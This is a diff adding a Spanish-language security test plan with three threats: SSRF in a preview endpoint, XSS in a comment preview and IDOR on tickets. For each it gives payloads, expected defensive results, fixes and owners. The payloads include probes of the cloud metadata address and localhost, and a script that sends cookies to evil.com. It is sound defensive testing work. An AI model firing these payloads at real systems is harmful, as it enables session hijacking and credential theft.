@@ -96,3 +96,60 @@ Riesgos que permanecen abiertos incluso con los controles propuestos aplicados: 
 **Alternativa considerada:** bloquear solo una lista de direcciones "malas" conocidas, en vez de decidir qué sí está permitido. Se descartó por ser también un **diseño inseguro**, esa lista nunca cubre todo, y un dominio puede cambiar a qué dirección apunta justo después de pasar la validación, evadiéndola.
 
 **Riesgo que queda abierto:** si el servidor sigue automáticamente un link que redirige a otro, alguien podría dar una URL que pasa la validación inicial pero termina llevando a una dirección interna prohibida. Falta revisar el destino de nuevo en cada salto de redirect.
+
+## Pruebas por amenaza 
+### Amenaza 1 SSRF en PreviewController
+**Descripción** El endpoint preview recibe una URL controlada por el cliente y realiza una petición HTTP sin validar la dirección apuntada a la red interna. 
+**Prueba a realizar** Se realiza una solicitud al endpoint enviando direcciones de IP privadas de la infraestructura cloud o del ámbito local.
+    Payloads de prueba:
+        GET /api/preview?url=[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)  
+        GET /api/preview?url=http://localhost/admin  
+**comportamiento interno** 
+    - repuesta del servidor: El sistema deberia interceptar la solicitud y responder con un codigo de estado de error indicando que la direccion no es valida o esta prohibida
+    - comportamiento interno: La aplicacion debe rechazar la solicitud en fase de validación de la url antes de realizar cualquier llamada o conexion HTTP saliente. No se debe devolver contenido sensible ni credenciales.
+**implementaciones posteriores** una vez implementada y validada la prueba se implementarian los siguientes controles
+    - implementación del filtro de dominio e IP 
+        crear un servicio de validacion que resuelva las direcciones dns antes de conectar.
+        aplicar una whitelist con esquemas autorizados y restringir el acceso a rangos privados 
+        deshabilitar el seguimiento automatico de redirecciones HTTP para evitar evadir la validación
+**Responsables**
+- lider de dearrollo / Backend : Responsable de implementar la logica de validación de las URL.
+- Especialista en Ciberseguridad : Responsable de revisar la configuración de la CSP en SecurityConfig 
+
+### Amenaza 2 XSS en CommentController
+**Descripción** El parámetro text se concatena directamente en la respuesta HTML (produces = TEXT_HTML_VALUE) sin escapado. Además, la Content Security Policy (CSP) actual contiene 'unsafe-inline', permitiendo la ejecución de código inyectado.
+**Prueba a realizar** 
+    Se envía una petición con scripts embebidos en el parámetro de texto de la vista previa.
+    Payload de prueba:GET /api/comments/preview?text=<script>alert(1)</script>  
+    GET /api/comments/preview?text=<script>document.location='[https://evil.com/steal?c='+document.cookie](https://evil.com/steal?c='+document.cookie)</script>  
+**Resultado esperado** 
+    La respuesta del codigo devuelve el texto con codificación de salida HTML 
+    El navegador web muestra el payload como texto plano y no ejecuta ningún script.  
+**Implementaciónes posteriores**
+    Aplicar codificación de entidad de salida (HTML Entity Encoding) mediante HtmlUtils.htmlEscape(text) en el controlador.
+    Modificar SecurityConfig para eliminar la directiva 'unsafe-inline' de la Content Security Policy (CSP), reforzando la defensa en profundidad.
+    Exigir autenticación obligatoria en la ruta /api/comments/preview alineándose al principio de Zero Trust.
+**Responsables**
+- Backend developer: Aplicar HtmlUtils.htmlEscape() en la respuesta de CommentController
+- Ingeniero de seguridad: Ajustar y probar las directivas CSP en la clase de configuración de Spring Security
+
+### Amenaza 3: IDOR en TicketController
+**Descripción** Los endpoints GET /api/tickets y GET /api/tickets/{id} devuelven registros de la base de datos sin validar si el usuario autenticado es el propietario del ticket o si posee un rol con permisos elevados (SUPPORT / ADMIN), exponiendo datos sensibles como privateNote
+**Prueba a ejecutar** 
+    Se realizan peticiones autenticadas como un usuario estudiante regular (Vasquez) intentando acceder a los tickets de otro usuario (Ruiz).
+    Prueba 1 (Obtener ticket individual ajeno):
+        Usuario autenticado: Vasquez
+        Request: GET /api/tickets/{id} (donde id corresponde a un ticket propiedad de Ruiz).
+    Prueba 2 (Listado global desde cuenta no administrativa):
+        Usuario autenticado: Vasquez
+        Request: GET /api/tickets.
+**Resultado Esperado** 
+    Prueba 1: El sistema responde con error impidiendo lectura de un ticket ajeno 
+    Prueba 2: El listado devuelto solo contiene tickets cuyo dueño coincide, no se incluye ningún ticket ni privateNote de otros usuarios.
+**Implementaciónes Posteriores** 
+    Implementar el filtrado de consultas por propietario en la capa de persistencia dentro de TicketController.all()
+    Incorporar una verificación explicita de rol antes de regresar el resultado en TicketController.one(id).
+    añadir registro de auditoria (loggers ) que capture e informe sobre intentos de acceso no autorizados.
+**Responsables** 
+- Backend developer: Modificar las consultas de TicketController y la integración con el contexto de seguridad para validar el usuario en sesión.
+- Tester de seguridad: Probar la matriz de control de acceso cruzando credenciales de usuarios de distintas áreas y roles.
